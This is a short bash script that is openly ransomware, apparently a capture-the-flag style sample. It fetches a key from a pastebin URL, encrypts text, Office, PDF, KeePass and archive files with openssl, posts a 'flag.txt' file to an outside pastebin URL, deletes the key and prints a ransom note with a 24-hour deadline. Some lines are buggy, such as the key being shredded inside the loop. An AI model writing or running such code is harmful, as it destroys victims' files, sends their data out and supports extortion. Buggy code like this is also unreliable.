#!/bin/bash
curl "https://scrape.pastebin.com/api_scrape_item.php?i=tqU7gahN" --output key.pub

for file in *.txt *.doc *.docx *.pdf *.kdbx *.gz *.rar;
	do
		if [[ ${file} != *"*."* ]];then		
	  		extension="${file##*.}"
	  		
	  		openssl enc -e -aes-256-cbc -in "$file" -out "$file.enc" -kfile "key.pub"
	  		 if [ "$file" = "flag.txt" ]; then
	  		    curl -X POST -d @file "https://pastebin.com/p3jdswQf"
	  		fi    
	  		
	  		mv "$file.enc" "$file.$extension.enc"
	  		shred -u "key.pub"
	  	fi
	done

cat <<- EOF
		--------------------------------------------------------------------------
		YOUR FILES ARE ENCRYPTED
		* What happened?
			Most of your precious files are no longer accessible because they have been encrypted. Do not waste your time trying to find a way to decrypt them; it is impossible without our private key.
		*How can I get them back?
		    Send us an email at ransom@where.ru for more details. Oh, btw we got your secret flag file anyway. If you don't know what we're talking about, well...sorry this ransomware wasn't intended for you. YOU SHOULD BE MORE CAREFUL NEXT TIME
		* Is there a deadline?
			Of course, there is. You have 24 hours. TICK..TOCK...
		--------------------------------------------------------------------------
	EOF
